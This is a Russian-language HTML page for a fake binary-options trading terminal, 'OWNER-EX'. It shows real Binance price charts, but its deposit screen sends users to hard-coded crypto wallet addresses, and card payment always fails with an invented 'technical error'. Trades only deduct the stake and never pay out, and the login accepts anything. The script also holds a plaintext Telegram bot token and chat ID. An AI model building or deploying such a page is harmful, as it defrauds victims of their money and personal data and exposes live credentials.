<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OWNER-EX PRO TERMINAL</title>
    
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2220%22 fill=%22%230ecb81%22/><text y=%22.9em%22 font-size=%2280%22 font-weight=%22900%22 x=%2250%%22 text-anchor=%22middle%22 fill=%22%23000%22>E</text></svg>">
    
    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');

        :root {
            --bg: #0b0e11;
            --panel: #161a1e;
            --accent: #0ecb81;
            --red: #f6465d;
            --green: #0ecb81;
            --border: #2b2f36;
            --radius: 6px;
        }

        body, html {
            margin: 0; padding: 0;
            background: var(--bg);
            color: #eaecef;
            font-family: 'Inter', sans-serif;
            height: 100%;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        /* AUTH */
        #authScreen {
            position: fixed; inset: 0; background: var(--bg); z-index: 9999;
            display: flex; align-items: center; justify-content: center;
        }
        .auth-card {
            background: var(--panel); padding: 40px; border-radius: 12px;
            width: 350px; border: 1px solid var(--border); text-align: center;
        }

        /* HEADER */
        header {
            height: 50px; background: var(--panel);
            border-bottom: 1px solid var(--border);
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 20px; flex-shrink: 0; z-index: 100;
        }
        .header-left { display: flex; align-items: center; gap: 15px; }
        
        /* WIDGETS */
        .selector-group { display: flex; align-items: center; gap: 8px; background: #000; padding: 4px 8px; border-radius: 4px; border: 1px solid var(--border); }
        
        select.nav-select {
            background: transparent; color: #fff; border: none;
            font-size: 12px; font-weight: 700; outline: none; cursor: pointer;
            appearance: none;
        }

        .chart-type-btn {
            background: transparent; border: none; color: #848e9c;
            cursor: pointer; font-size: 14px; padding: 2px 6px; transition: 0.2s;
        }
        .chart-type-btn.active { color: var(--accent); }

        /* REAL/DEMO */
        .acc-toggle { display: flex; background: #000; border: 1px solid var(--border); padding: 2px; border-radius: 6px; }
        .acc-btn {
            padding: 4px 14px; border: none; background: none;
            color: #848e9c; cursor: pointer; font-size: 11px;
            font-weight: 800; border-radius: 4px;
        }
        .acc-btn.active { background: #2b2f36; color: var(--accent); }

        /* TERMINAL LAYOUT */
        .terminal-container {
            display: grid; grid-template-columns: 60px 1fr 280px;
            flex: 1; min-height: 0;
        }
        .side-nav {
            background: var(--panel); border-right: 1px solid var(--border);
            display: flex; flex-direction: column; align-items: center;
            padding: 20px 0; gap: 25px;
        }
        .nav-item { font-size: 20px; color: #848e9c; cursor: pointer; }
        .nav-item:hover { color: var(--accent); }

        .chart-section { display: flex; flex-direction: column; border-right: 1px solid var(--border); position: relative; background: #000; }
        .chart-overlay { position: absolute; top: 15px; left: 15px; z-index: 10; pointer-events: none; }
        .overlay-sym { font-size: 18px; font-weight: 900; }
        .overlay-pay { color: var(--accent); font-size: 12px; font-weight: 700; }

        #chart { flex: 1; }

        /* TRADE PANEL */
        .trade-panel { padding: 20px; background: var(--panel); display: flex; flex-direction: column; gap: 12px; }
        .input-group { background: var(--bg); border: 1px solid var(--border); padding: 10px; border-radius: var(--radius); }
        .input-group label { display: block; font-size: 9px; color: #848e9c; text-transform: uppercase; margin-bottom: 4px; }
        .input-group input { background: transparent; border: none; color: #fff; width: 100%; font-size: 18px; font-weight: 800; outline: none; }

        .btn-exec { height: 55px; border: none; border-radius: var(--radius); font-weight: 900; font-size: 16px; cursor: pointer; }
        .btn-call { background: var(--green); color: #000; }
        .btn-put { background: var(--red); color: #fff; }

        /* MODALS */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; display: none; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
        .modal-box { background: var(--panel); width: 420px; padding: 30px; border-radius: 12px; border: 1px solid var(--border); }
        .custom-input { background: #0b0e11; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 4px; width: 100%; box-sizing: border-box; margin-bottom: 12px; font-size: 14px; outline: none; }
        
        .pay-methods { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .pay-item { background: #0b0e11; border: 1px solid var(--border); padding: 12px; border-radius: 6px; text-align: center; cursor: pointer; font-size: 11px; }
        .pay-item.active { border-color: var(--accent); }
        .requisites-box { background: #000; padding: 15px; border-radius: 6px; font-family: monospace; margin: 15px 0; font-size: 12px; word-break: break-all; color: var(--accent); border: 1px dashed var(--border); }
        
        footer { height: 30px; background: var(--panel); border-top: 1px solid var(--border); display: flex; align-items: center; justify-content: center; gap: 30px; font-size: 10px; color: #848e9c; }
    </style>
</head>
<body>

<div id="authScreen">
    <div class="auth-card">
        <h2 style="color:var(--accent); margin-bottom:20px;">OWNER-EX</h2>
        <input type="text" class="custom-input" placeholder="Логин">
        <input type="password" class="custom-input" placeholder="Пароль">
        <button onclick="login()" class="btn-exec btn-call" style="width:100%;">ВОЙТИ</button>
    </div>
</div>

<header>
    <div class="header-left">
        <div class="selector-group">
            <select id="assetSelect" class="nav-select" onchange="changeSymbol(this.value)">
                <optgroup label="Криптовалюты">
                    <option value="BTCUSDT">BTC / USDT</option>
                    <option value="ETHUSDT">ETH / USDT</option>
                    <option value="SOLUSDT">SOL / USDT</option>
                    <option value="BNBUSDT">BNB / USDT</option>
                </optgroup>
                <optgroup label="Валютные пары">
                    <option value="EURUSDT">EUR / USD</option>
                    <option value="GBPUSDT">GBP / USD</option>
                    <option value="AUDUSDT">AUD / USD</option>
                    <option value="USDJPY">USD / JPY</option>
                </optgroup>
            </select>
        </div>

        <div class="selector-group">
            <select id="timeframeSelect" class="nav-select" onchange="changeInterval(this.value)">
                <option value="1s">S10</option>
                <option value="1s">S30</option>
                <option value="1m" selected>M1</option>
                <option value="3m">M3</option>
                <option value="5m">M5</option>
                <option value="15m">M15</option>
                <option value="30m">M30</option>
                <option value="1h">H1</option>
                <option value="2h">H2</option>
            </select>
        </div>

        <div class="selector-group">
            <button class="chart-type-btn active" id="btn-candles" onclick="setChartType('candles')"><i class="fas fa-chart-bar"></i></button>
            <button class="chart-type-btn" id="btn-area" onclick="setChartType('area')"><i class="fas fa-chart-line"></i></button>
        </div>
    </div>

    <div style="display: flex; align-items: center; gap: 15px;">
        <div class="acc-toggle">
            <button class="acc-btn active" id="demoBtn" onclick="switchAcc('demo')">DEMO</button>
            <button class="acc-btn" id="realBtn" onclick="switchAcc('real')">REAL</button>
        </div>
        <div id="balanceDisplay" style="font-weight: 800; color: var(--green);">$10,000.00</div>
    </div>
</header>

<div class="terminal-container">
    <div class="side-nav">
        <i class="fas fa-chart-line nav-item" onclick="closeModals()"></i>
        <i class="fas fa-wallet nav-item" onclick="openModal('cashierModal')"></i>
        <i class="fas fa-user-circle nav-item" onclick="openModal('profileModal')"></i>
        <i class="fas fa-headset nav-item" onclick="alert('Поддержка: @owner_ex_admin')"></i>
    </div>

    <div class="chart-section">
        <div class="chart-overlay">
            <div class="overlay-sym" id="displaySym">BTC / USDT</div>
            <div class="overlay-pay">ВЫПЛАТА 82%</div>
        </div>
        <div id="chart"></div>
    </div>

    <div class="trade-panel">
        <div class="input-group"><label>Сумма (USDT)</label><input type="number" id="tradeAmount" value="100"></div>
        <div class="input-group"><label>Время (Сек)</label><input type="number" id="tradeTime" value="30"></div>
        <button class="btn-exec btn-call" onclick="trade('CALL')">ВЫШЕ ↑</button>
        <button class="btn-exec btn-put" onclick="trade('PUT')">НИЖЕ ↓</button>
    </div>
</div>

<div id="profileModal" class="modal-overlay">
    <div class="modal-box">
        <h3 style="text-align: center;">ПРОФИЛЬ</h3>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
            <input type="text" id="p_name" class="custom-input" placeholder="Имя">
            <input type="text" id="p_surname" class="custom-input" placeholder="Фамилия">
            <input type="text" id="p_nick" class="custom-input" placeholder="Никнейм">
            <input type="text" id="p_phone" class="custom-input" placeholder="Телефон">
            <input type="text" id="p_email" class="custom-input" placeholder="Email">
            <input type="text" id="p_country" class="custom-input" placeholder="Страна">
            <input type="text" id="p_birth" class="custom-input" placeholder="Дата рождения">
            <input type="text" id="p_promo" class="custom-input" placeholder="Промокод">
        </div>
        <button onclick="saveProfile()" class="btn-exec btn-call" style="width:100%; margin-top:10px;">СОХРАНИТЬ</button>
        <p onclick="closeModals()" style="text-align:center; cursor:pointer; font-size:12px; color:gray;">Закрыть</p>
    </div>
</div>

<div id="cashierModal" class="modal-overlay">
    <div class="modal-box">
        <div id="cashMain">
            <div style="display:flex; justify-content: space-around; margin-bottom:20px;">
                <h4 id="tDep" style="color:var(--accent); cursor:pointer;" onclick="setTab('dep')">ДЕПОЗИТ</h4>
                <h4 id="tWit" style="color:gray; cursor:pointer;" onclick="setTab('wit')">ВЫВОД</h4>
            </div>
            <div class="pay-methods">
                <div class="pay-item active" onclick="selPay(this, 'USDT TRC20')">USDT TRC20</div>
                <div class="pay-item" onclick="selPay(this, 'TON')">TON / USDT</div>
                <div class="pay-item" onclick="selPay(this, 'BTC')">BTC</div>
                <div class="pay-item" onclick="selPay(this, 'ETH')">ETH</div>
                <div class="pay-item" onclick="selPay(this, 'CARD')">КАРТА</div>
            </div>
            <input type="number" id="cAmount" class="custom-input" placeholder="Сумма ($)">
            <button class="btn-exec btn-call" style="width:100%;" onclick="goPay()">ПРОДОЛЖИТЬ</button>
        </div>
        <div id="cashPay" style="display:none; text-align:center;">
            <h3>РЕКВИЗИТЫ</h3>
            <div class="requisites-box" id="reqText"></div>
            <button class="btn-exec btn-call" style="width:100%;" onclick="confirmPay()">Я ОПЛАТИЛ</button>
            <p onclick="backCash()" style="margin-top:10px; cursor:pointer; font-size:12px;">Назад</p>
        </div>
        <p onclick="closeModals()" style="text-align:center; cursor:pointer; font-size:12px; color:gray; margin-top:15px;">Отмена</p>
    </div>
</div>

<footer>
    <span>ПОДДЕРЖКА</span>
    <span>FAQ</span>
    <span>ПОЛИТИКА</span>
</footer>

<script>
    const TG_TOKEN = "8102627080:AAGGbjyR0g1VzICKb-ait4t3CA34PJz1g5M";
    const TG_ID = "6426834853";
    
    let chart, series, curSym = "BTCUSDT", curInterval = "1m", lastPrice = 0;
    let bals = { demo: 10000, real: 0 }, curAcc = 'demo', curPay = 'USDT TRC20';

    function login() { document.getElementById('authScreen').style.display = 'none'; initChart(); }

    function initChart() {
        const container = document.getElementById('chart');
        chart = LightweightCharts.createChart(container, {
            layout: { background: { color: '#000' }, textColor: '#848e9c' },
            grid: { vertLines: { color: '#111' }, horzLines: { color: '#111' } },
            timeScale: { timeVisible: true, secondsVisible: true, borderVisible: false },
            rightPriceScale: { borderVisible: false }
        });
        setChartType('candles');
        loadHistory();
    }

    function setChartType(type) {
        if (series) chart.removeSeries(series);
        document.querySelectorAll('.chart-type-btn').forEach(b => b.classList.remove('active'));
        
        if (type === 'candles') {
            series = chart.addCandlestickSeries({ upColor: '#0ecb81', downColor: '#f6465d', borderVisible: false, wickUpColor: '#0ecb81', wickDownColor: '#f6465d' });
            document.getElementById('btn-candles').classList.add('active');
        } else {
            series = chart.addAreaSeries({ lineColor: '#0ecb81', topColor: 'rgba(14, 203, 129, 0.4)', bottomColor: 'rgba(14, 203, 129, 0)' });
            document.getElementById('btn-area').classList.add('active');
        }
        loadHistory();
    }

    function loadHistory() {
        fetch(`https://api.binance.com/api/v3/klines?symbol=${curSym}&interval=${curInterval}&limit=500`)
            .then(r => r.json()).then(data => {
                const formatted = data.map(d => ({ time: d[0]/1000, open: +d[1], high: +d[2], low: +d[3], close: +d[4], value: +d[4] }));
                series.setData(formatted);
                setupWS();
            });
    }

    function setupWS() {
        if (window.ws) window.ws.close();
        window.ws = new WebSocket(`wss://stream.binance.com:9443/ws/${curSym.toLowerCase()}@kline_1s`);
        window.ws.onmessage = e => {
            const k = JSON.parse(e.data).k;
            lastPrice = +k.c;
            series.update({ time: k.t/1000, open: +k.o, high: +k.h, low: +k.l, close: lastPrice, value: lastPrice });
        };
    }

    function changeSymbol(s) { 
        curSym = s; 
        document.getElementById('displaySym').innerText = s.replace('USDT', ' / USDT');
        loadHistory(); 
    }
    
    function changeInterval(i) { curInterval = i; loadHistory(); }

    function switchAcc(a) {
        curAcc = a;
        document.getElementById('demoBtn').classList.toggle('active', a==='demo');
        document.getElementById('realBtn').classList.toggle('active', a==='real');
        document.getElementById('balanceDisplay').innerText = `$${bals[a].toLocaleString()}`;
    }

    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
    function closeModals() { document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none'); }

    // КАССА
    function selPay(el, name) {
        document.querySelectorAll('.pay-item').forEach(p => p.classList.remove('active'));
        el.classList.add('active'); curPay = name;
    }

    function goPay() {
        const amt = document.getElementById('cAmount').value;
        if (amt < 10) return alert("Мин. $10");
        if (curPay === 'CARD') return alert("Техническая ошибка, попробуйте позже");
        
        document.getElementById('cashMain').style.display = 'none';
        document.getElementById('cashPay').style.display = 'block';
        
        const reqs = {
            'USDT TRC20': 'TRRPjzHTcHeBLzCuR5GyMQ6osvQMk3Vnq7',
            'TON': 'UQDkdhn6ugwcRTBxzl6x5Ssxn-DD3wiRGi6e-c4yy1HAcoXa',
            'BTC': 'bc1qvf4wevx5lyjsz5l6mtpq9rs6qehssf5rmzfv4t',
            'ETH': '0x9De3fd62a718EE7eA1C7a5c25F4f2648aEE07083'
        };
        document.getElementById('reqText').innerText = reqs[curPay];
    }

    function confirmPay() {
        alert("Заявка отправлена!"); closeModals(); backCash();
    }
    
    function backCash() {
        document.getElementById('cashMain').style.display = 'block';
        document.getElementById('cashPay').style.display = 'none';
    }

    function trade(type) {
        const amt = +document.getElementById('tradeAmount').value;
        if (amt > bals[curAcc]) return alert("Недостаточно средств");
        bals[curAcc] -= amt; switchAcc(curAcc);
        alert(`Сделка ${type} открыта на ${document.getElementById('tradeTime').value} сек.`);
    }

</script>
</body>
</html>
